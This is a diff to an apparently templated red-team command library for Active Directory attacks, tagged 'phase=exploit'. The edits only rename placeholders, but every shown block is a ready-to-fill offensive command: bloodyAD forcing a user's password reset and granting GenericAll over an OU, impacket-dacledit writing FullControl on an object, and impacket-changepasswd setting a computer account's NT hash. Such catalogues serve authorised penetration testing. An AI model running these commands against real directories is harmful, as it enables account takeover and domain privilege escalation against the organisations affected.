@@ -219,7 +219,7 @@ echo 'Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | ?{ $_.O
 Force-set a target user password (needs reset rights).
 
 ```bash
-bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} set password "{{TARGET_USER:str:victim}}" "{{NEW_PASSWORD:str:NewPass!2024}}"
+bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} set password "{{TARGET_USER:str:victim}}" "{{TARGET_PASSWORD:str}}"
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=ad,bloodyad,password -->
@@ -241,7 +241,7 @@ bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domai
 Grant GenericAll over an OU to a principal.
 
 ```bash
-bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} add genericAll "OU={{OU_NAME:str:Servers}},DC=corp,DC=local" "{{TARGET_PRINCIPAL:str:user}}"
+bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} add genericAll "OU={{OU_NAME:str:Servers}},DC=corp,DC=local" "{{TARGET_USER:str}}"
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=ad,acl,bloodyad -->
@@ -252,7 +252,7 @@ bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domai
 Write FullControl on target object.
 
 ```bash
-impacket-dacledit -action 'write' -rights 'FullControl' -principal '{{ATTACKER:str:user}}' -target '{{TARGET_OBJ:str:victim}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}'
+impacket-dacledit -action 'write' -rights 'FullControl' -principal '{{ATTACKER:str:user}}' -target '{{TARGET_USER:str}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}'
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=ad,acl,dacledit -->
@@ -395,7 +395,7 @@ impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWO
 Set new computer-account password / NT hash.
 
 ```bash
-KRB5CCNAME={{COMP:str:web01}}.ccache impacket-changepasswd -newhashes :{{NEW_NT:str:995a55584f2544f5195ecf35070cd7a8}} '{{DOMAIN:domain:corp.local}}/{{COMP:str:web01}}$:{{OLD_PASS:str:OldPass}}@{{DC_HOST:str:dc.corp.local}}' -k
+KRB5CCNAME={{COMP:str:web01}}.ccache impacket-changepasswd -newhashes :{{TARGET_NTHASH:str}} '{{DOMAIN:domain:corp.local}}/{{COMP:str:web01}}$:{{OLD_PASS:str:OldPass}}@{{DC_HOST:str:dc.corp.local}}' -k
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=ad,computer,password -->
